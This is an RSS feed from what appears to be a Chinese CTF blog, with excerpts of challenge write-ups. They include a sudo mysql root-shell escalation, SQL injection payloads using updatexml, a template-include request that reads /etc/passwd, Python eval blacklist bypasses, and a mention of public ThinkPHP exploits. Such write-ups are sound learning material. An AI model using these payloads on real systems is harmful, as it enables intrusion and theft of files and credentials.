<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>All Posts - ThnPinkman’s blog</title>
        <link>https://thnpkm.github.io/posts/</link>
        <description>All Posts | ThnPinkman’s blog</description>
        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</lastBuildDate><atom:link href="https://thnpkm.github.io/posts/" rel="self" type="application/rss+xml" /><item>
    <title>春秋云镜 Initial</title>
    <link>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</link>
    <pubDate>Thu, 22 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</guid>
    <description><![CDATA[春秋云镜 Initial 外网打点 站点图标很好判断是TP的站
拿TP漏洞利用工具试一下
getshell
一般的目录下没有flag，即继续看能不能提权
提权 首先尝试能不能suid提权
感觉没有好利用的
查看linux的信息 这种流程走一遍
uname -a 查看系统全部信息 # Linux ubuntu-web01 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linuxuname -r 查看内核版本 # 5.4.0-110-generic 可以用kali的自带工具searchsploit 找对应版本的提权，无果
继续可以看 sudo
sudo -l 列出目前用户可执行与无法执行的指令 (root) NOPASSWD: /usr/bin/mysql https://mp.weixin.qq.com/s/9iZiOq1rT0E3QiB4VAQtzg上面的文章提到 以上结果列出了mysql，就可以使用 sudo mysql -e &lsquo;! /bin/sh&rsquo; 获得一个特权shell，或者 sudo -u root mysql -e &lsquo;! /bin/sh&rsquo;
这种格式可以执行root权限命令，来找一下flag
sudo mysql -e &#39;\! find / -name flag*&#39; 读flag]]></description>
</item>
<item>
    <title>0xgame2022</title>
    <link>https://thnpkm.github.io/posts/ctf/0xgame2022/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/0xgame2022/</guid>
    <description><![CDATA[do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子]]></description>
</item>
<item>
    <title>2020羊城杯</title>
    <link>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/</guid>
    <description><![CDATA[WEB easycon 打开就是
扫出来个index.php 然后访问
提示eval post cmd，看来是post了个cmd可以执行命令
找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
easyphp 源码
&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !]]></description>
</item>
<item>
    <title>2023巅峰极客</title>
    <link>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</guid>
    <description><![CDATA[web hellsql 测试后发现没有啥有用的回显，只有触发了waf才回显nonono
只要没触发waf不论sql语句是否正确都只回显： 泰酷辣！
所以没有布尔回显的话，布尔盲注不可行。
想去时间盲注，发现sleep等常用的关键字被禁的很严，尝试去绕过，失败
想去写shell，union被过滤的也很严，绕过无果
最后wp还是时间盲注，不过是用笛卡尔积
话说笛卡尔积确实在当初学mysql 的时候学到过，早已淡忘。现在来看看这个是什么样的思路：
具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统
unserialize 反序列化字符逃逸
misc findme find.dmp文件
010里
Netfilx图片格式
avif的文件头 66 74 79 70 61 76 69 66
手动分离出avif图片
生物 脑洞题
两张相同图片。盲水印
得到信息：甲硫氨酸
某个图片后面拿到一串氨基酸缩写
MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM 甲硫氨酸对应的缩写是 M
到这里就挺迷惑的了
也想到了找M对应的下标
0 3 5 6 10 11 15 16 18 19 21 24 25 27 28 30 34 35 37 38 40 42 44 45 46 47 49 50 52 53 55 57 58 59 61 63 65 66 67 69 70 71 72 74 76 78 80 81 82 83 85 86 87 89 90 91 92 94 95 96 98 100 102 103 104 105 107 108 109 111 113 114 116 118 119 121 122 124 126 128 130 131 132 133 135 137 139 141 142 143 144 146 148 150 152 154 156 157 159 160 162 164 165 167 168 170 171 173 174 176 178 179 180 181 183 184 186 187 188 190 192 194 195 197 198 200 201 203 204 205 207 209 211 213 214 215 后面提示了找位置，但是没想到最后还是搞bin]]></description>
</item>
<item>
    <title>b01lers CTF</title>
    <link>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/b01lers-ctf/</guid>
    <description><![CDATA[2023 web warmup 是一个flask的站，访问文件需要先base64编码
/app.py编码拿到源码
from base64 import b64decode import flask app = flask.Flask(__name__) @app.route(&#39;/&lt;name&gt;&#39;) def index2(name): name = b64decode(name) if (validate(name)): return &#34;This file is blocked!&#34; try: file = open(name, &#39;r&#39;).read() except: return &#34;File Not Found&#34; return file @app.route(&#39;/&#39;) def index(): return flask.redirect(&#39;/aW5kZXguaHRtbA==&#39;) def validate(data): if data == b&#39;flag.txt&#39;: return True return False if __name__ == &#39;__main__&#39;: app.run() 这里对flag.txt做了严格过滤，当时的思路还是什么加空格换行绕过，不过相对路径就可以绕过。
./flag.txt相对路径，即可绕过检测
fishy-motd 2020 web Welcome to Earth 之前buu写过了
抓包一直找路由，一直走
最后拿到flag]]></description>
</item>
<item>
    <title>BUUCTF NewStarCTF</title>
    <link>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/buuctf-newstarctf/</guid>
    <description><![CDATA[week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
联合查询 ，没有回显点
报错查询
name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
拿到正确的种子
&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?]]></description>
</item>
<item>
    <title>CatCTF</title>
    <link>https://thnpkm.github.io/posts/ctf/catctf/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/catctf/</guid>
    <description><![CDATA[MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
strings xxx | grep CatCTF{
Peekaboo MeowMeow CatCTF{CAT_GOES_MEOW} ,010打开看ascii的形状，ctfshow有一道这样的题
miao~ strings 了一下，出现这一堆
网上有些题是 直接看属性有东西，exiftool没发现啥
foremost 出 wav ，频谱图
CatCTF 某个密码
试试jpg隐写的工具，都没试出来，卡这里了，wav我也去尝试了silenteye没结果
正确是DeepSound工具解密，之前没用过 ,选择wav输入密码，得到个flag.txt
在他默认保存路径可以打开flag.txt
然后兽语解密
CatCat 这个文件名一看就猜测是 rabbit加密 和base91
rabbit的密钥，jpg用010打开搜索pass
密钥是catflag
然后base91
这一看就是Ook解密，将cat替换成Ook
CatchCat 可爱的猫猫走丢了，还好猫猫有GPS定位装置，我们陆陆续续在终端收到了GPS数据，你能帮忙找到可爱的猫猫吗？
给了一堆GPGGA的数据，找了很久没有找到合适的网站
想着提取出经纬度
f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:30]+&#39;,&#39;+line[33:47]) 刚开始用gnuplot画个图，但是画出来看不出啥，想着去用谷歌地球画路线，不过需要KML文件
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;kml xmlns=&#34;http://www.opengis.net/kml/2.2&#34;&gt; &lt;Document&gt; &lt;name&gt;KML&lt;/name&gt; &lt;description&gt;KML&lt;/description&gt; &lt;Placemark&gt; &lt;name&gt;[2011/2/1 19:59:14]&lt;/name&gt; &lt;description&gt;line&lt;/description&gt; &lt;LineString&gt; &lt;coordinates&gt; 3416.48590278,10856.86623887 3416.48590278,10856.86623887 .......................... &lt;/coordinates&gt; &lt;/LineString&gt; &lt;/Placemark&gt; &lt;/Document&gt; &lt;/kml&gt; 将经纬度替换后，导入谷歌地球]]></description>
</item>
<item>
    <title>ciscn2023初赛</title>
    <link>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/</guid>
    <description><![CDATA[go_session GET /admin?name={%25%20include%20c.Request.Header.Accept.0%20%25} HTTP/1.1Host: 123.56.99.60:12488Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: /etc/passwdAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: session-name=MTY4NTE2NjEzNnxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUFqXzRJQUFRWnpkSEpwYm1jTUJnQUVibUZ0WlFaemRISnBibWNNQndBRllXUnRhVzQ9fEDXM_0GyRu_LshoipBIWA6dvJ8u4d-oTgM7OGlKvC2SConnection: close 实现任意文件读取
还是]]></description>
</item>
<item>
    <title>D^3ctf 2023</title>
    <link>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/d3ctf-2023/</guid>
    <description><![CDATA[web EscapePlan 源码是ban了很多字符和关键字
black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;+&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
例如：
int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通]]></description>
</item>
<item>
    <title>DAS x SU</title>
    <link>https://thnpkm.github.io/posts/ctf/das-x-su/</link>
    <pubDate>Tue, 20 Aug 2024 23:51:36 &#43;0800</pubDate>
    <author>Author</author>
    <guid>https://thnpkm.github.io/posts/ctf/das-x-su/</guid>
    <description><![CDATA[WEB pdf_converter 大家都非预期了
发现是ThinkPHP5 的框架
直接可以随便用公开的payload直接打
pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
https://buaq.net/go-129526.html跟着文章复现
直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.]]></description>
</item>
</channel>
</rss>
